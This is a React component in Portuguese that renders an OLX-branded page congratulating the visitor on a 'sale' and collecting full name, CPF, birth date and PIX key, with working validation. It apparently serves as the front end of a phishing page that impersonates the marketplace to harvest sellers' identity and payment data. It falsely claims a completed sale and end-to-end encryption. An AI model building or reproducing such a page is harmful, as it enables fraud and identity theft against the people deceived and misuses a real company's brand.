import { useState } from "react";
import { Button } from "@/components/ui/button";
import { CheckCircle2, ShieldCheck, AlertCircle } from "lucide-react";

type Props = {
  onContinuar: (dados: {
    nome: string;
    cpf: string;
    nascimento: string;
    tipoChave: string;
    chavePix: string;
  }) => void;
};

function validarCPF(cpf: string) {
  const digits = cpf.replace(/\D/g, "");
  if (digits.length !== 11) return false;
  if (/^(\d)\1+$/.test(digits)) return false;
  let sum = 0;
  for (let i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i);
  let rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  if (rest !== parseInt(digits[9])) return false;
  sum = 0;
  for (let i = 0; i < 10; i++) sum += parseInt(digits[i]) * (11 - i);
  rest = (sum * 10) % 11;
  if (rest === 10 || rest === 11) rest = 0;
  return rest === parseInt(digits[10]);
}

function validarNomeCompleto(nome: string) {
  const partes = nome.trim().split(/\s+/);
  return partes.length >= 2 && partes.every(p => p.length >= 2);
}

function validarNascimento(nascimento: string) {
  if (!nascimento) return false;
  const data = new Date(nascimento);
  if (isNaN(data.getTime())) return false;
  const anoMax = 2009;
  return data.getFullYear() <= anoMax;
}

function validarChavePix(tipo: string, chave: string) {
  const v = chave.trim();
  if (!v) return false;
  if (tipo === "CPF") return /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(v) && validarCPF(v);
  if (tipo === "CNPJ") return /^\d{2}\.\d{3}\.\d{3}\/\d{4}-\d{2}$/.test(v);
  if (tipo === "EMAIL") return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
  if (tipo === "PHONE") return /^\(\d{2}\)\s?\d{4,5}-\d{4}$/.test(v);
  if (tipo === "EVP") return v.length >= 10;
  return false;
}

export default function Cadastro({ onContinuar }: Props) {
  const [nome, setNome] = useState("");
  const [cpf, setCpf] = useState("");
  const [nascimento, setNascimento] = useState("");
  const [tipoChave, setTipoChave] = useState("");
  const [chavePix, setChavePix] = useState("");
  const [erros, setErros] = useState<Record<string, string>>({});
  const [tentou, setTentou] = useState(false);

  const formatCpf = (v: string) => {
    v = v.replace(/\D/g, "").slice(0, 11);
    if (v.length <= 3) return v;
    if (v.length <= 6) return `${v.slice(0,3)}.${v.slice(3)}`;
    if (v.length <= 9) return `${v.slice(0,3)}.${v.slice(3,6)}.${v.slice(6)}`;
    return `${v.slice(0,3)}.${v.slice(3,6)}.${v.slice(6,9)}-${v.slice(9)}`;
  };

  const formatPhone = (v: string) => {
    v = v.replace(/\D/g, "").slice(0, 11);
    if (v.length <= 2) return v;
    if (v.length <= 7) return `(${v.slice(0,2)}) ${v.slice(2)}`;
    return `(${v.slice(0,2)}) ${v.slice(2,7)}-${v.slice(7)}`;
  };

  const formatCNPJ = (v: string) => {
    v = v.replace(/\D/g, "").slice(0, 14);
    if (v.length <= 2) return v;
    if (v.length <= 5) return `${v.slice(0,2)}.${v.slice(2)}`;
    if (v.length <= 8) return `${v.slice(0,2)}.${v.slice(2,5)}.${v.slice(5)}`;
    if (v.length <= 12) return `${v.slice(0,2)}.${v.slice(2,5)}.${v.slice(5,8)}/${v.slice(8)}`;
    return `${v.slice(0,2)}.${v.slice(2,5)}.${v.slice(5,8)}/${v.slice(8,12)}-${v.slice(12)}`;
  };

  const handleChavePix = (v: string) => {
    if (tipoChave === "CPF") setChavePix(formatCpf(v));
    else if (tipoChave === "PHONE") setChavePix(formatPhone(v));
    else if (tipoChave === "CNPJ") setChavePix(formatCNPJ(v));
    else setChavePix(v);
  };

  const validar = () => {
    const e: Record<string, string> = {};
    if (!validarNomeCompleto(nome)) e.nome = "Digite seu nome completo (nome e sobrenome).";
    if (!validarCPF(cpf)) e.cpf = "CPF inválido. Digite um CPF válido com 11 dígitos.";
    if (!nascimento) e.nascimento = "Informe sua data de nascimento.";
    else if (!validarNascimento(nascimento)) e.nascimento = "Você precisa ter pelo menos 15 anos para continuar.";
    if (!tipoChave) e.tipoChave = "Selecione o tipo de chave PIX.";
    else if (!validarChavePix(tipoChave, chavePix)) e.chavePix = "Chave PIX inválida para o tipo selecionado.";
    return e;
  };

  const handleSubmit = () => {
    setTentou(true);
    const e = validar();
    setErros(e);
    if (Object.keys(e).length > 0) return;
    onContinuar({ nome: nome.trim(), cpf, nascimento, tipoChave, chavePix: chavePix.trim() });
  };

  const campo = (label: string, key: string, input: React.ReactNode) => (
    <div>
      <label className="block text-sm font-medium text-gray-700 mb-1">{label}</label>
      {input}
      {tentou && erros[key] && (
        <div className="flex items-center gap-1 mt-1">
          <AlertCircle className="h-3.5 w-3.5 text-red-500 flex-shrink-0" />
          <p className="text-xs text-red-500">{erros[key]}</p>
        </div>
      )}
    </div>
  );

  const inputClass = (key: string) =>
    `w-full px-4 py-2.5 border rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-purple-500 ${
      tentou && erros[key] ? "border-red-400 bg-red-50" : "border-gray-300"
    }`;

  const placeholderChave: Record<string, string> = {
    CPF: "000.000.000-00",
    CNPJ: "00.000.000/0000-00",
    EMAIL: "seu@email.com",
    PHONE: "(11) 99999-9999",
    EVP: "Chave aleatória",
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <header className="border-b border-gray-100 bg-white py-4">
        <div className="container flex items-center justify-between">
          <img src="/logo.png" alt="OLX" className="h-16 w-auto" />
          <div className="text-sm text-gray-500">Segurança em Primeiro Lugar</div>
        </div>
      </header>

      <main className="container py-10 flex-1 max-w-2xl mx-auto">
        <div className="mb-8 rounded-xl border border-green-200 bg-green-50 p-6 flex gap-4 items-start">
          <CheckCircle2 className="h-10 w-10 text-green-500 mt-1 flex-shrink-0" />
          <div>
            <h1 className="text-2xl font-bold text-gray-900 mb-1">Parabéns pela sua venda! 🎉</h1>
            <p className="text-gray-600 leading-relaxed">
              Sua venda foi realizada com sucesso na OLX. Para garantir a segurança da transação e processar seu pagamento, precisamos confirmar alguns dados seus.
            </p>
          </div>
        </div>

        <div className="rounded-xl border border-gray-200 bg-white p-8 shadow-sm mb-6">
          <h2 className="text-lg font-semibold text-gray-900 mb-6">Confirme seus dados</h2>
          <div className="space-y-5">
            {campo("Nome completo", "nome",
              <input type="text" value={nome} onChange={e => setNome(e.target.value)}
                placeholder="Seu nome completo" className={inputClass("nome")} />
            )}
            {campo("CPF", "cpf",
              <input type="text" value={cpf} onChange={e => setCpf(formatCpf(e.target.value))}
                placeholder="000.000.000-00" className={inputClass("cpf")} />
            )}
            {campo("Data de nascimento", "nascimento",
              <input type="date" value={nascimento} onChange={e => setNascimento(e.target.value)}
                max="2009-12-31" className={inputClass("nascimento")} />
            )}
            {campo("Tipo de chave PIX", "tipoChave",
              <select value={tipoChave} onChange={e => { setTipoChave(e.target.value); setChavePix(""); }}
                className={`${inputClass("tipoChave")} bg-white`}>
                <option value="">Selecione o tipo</option>
                <option value="CPF">CPF</option>
                <option value="CNPJ">CNPJ</option>
                <option value="EMAIL">E-mail</option>
                <option value="PHONE">Telefone</option>
                <option value="EVP">Chave aleatória</option>
              </select>
            )}
            {tipoChave && campo("Chave PIX", "chavePix",
              <input type="text" value={chavePix} onChange={e => handleChavePix(e.target.value)}
                placeholder={placeholderChave[tipoChave]} className={inputClass("chavePix")} />
            )}
          </div>
        </div>

        <div className="mb-6 rounded-lg bg-gray-50 p-4 border border-gray-200 flex gap-3">
          <ShieldCheck className="h-5 w-5 text-purple-600 flex-shrink-0 mt-0.5" />
          <p className="text-sm text-gray-600">
            Seus dados são protegidos com criptografia de ponta a ponta e utilizados exclusivamente para processar seu pagamento.
          </p>
        </div>

        <Button onClick={handleSubmit}
          className="w-full h-12 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-lg">
          Continuar →
        </Button>
      </main>
    </div>
  );
}
